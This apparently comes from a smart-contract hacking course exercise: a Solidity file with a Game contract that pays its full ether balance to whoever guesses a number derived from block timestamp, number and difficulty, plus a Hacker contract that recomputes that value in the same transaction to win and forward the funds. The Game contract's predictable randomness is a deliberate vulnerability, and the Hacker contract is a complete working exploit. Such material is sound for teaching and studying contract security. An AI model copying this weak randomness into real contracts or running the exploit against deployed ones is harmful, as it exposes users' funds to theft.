// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

/**
 * @title Game
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract Game {
  constructor() payable {}

  function play(uint guess) external {
    uint number = uint(
      keccak256(
        abi.encodePacked(block.timestamp, block.number, block.difficulty)
      )
    );

    if (guess == number) {
      (bool sent, ) = msg.sender.call{ value: address(this).balance }("");
      require(sent, "Failed to send ETH");
    }
  }
}

contract Hacker {
  //Define a Game Contract Instance
  Game game;

  //Set the Game's address at deployment
  constructor(address _game) {
    game = Game(_game);
  }

  function playAndWin() external {
    //Reuse the Number Variable
    uint number = uint(
      keccak256(
        abi.encodePacked(block.timestamp, block.number, block.difficulty)
      )
    );
    //Call the Play function from the Game's Contract
    (bool sucess, ) = address(game).call(
      abi.encodeWithSignature("play(uint256)", number)
    );
    require(sucess, "Play function couldn't be called");
    //Send the fund to myself 😈
    (bool sent, ) = msg.sender.call{ value: address(this).balance }("");
    require(sent, "Failed to send ETH to Hacker");
  }

  //Make sure the Game's contract can send funds to my contract.
  receive() external payable {}
}
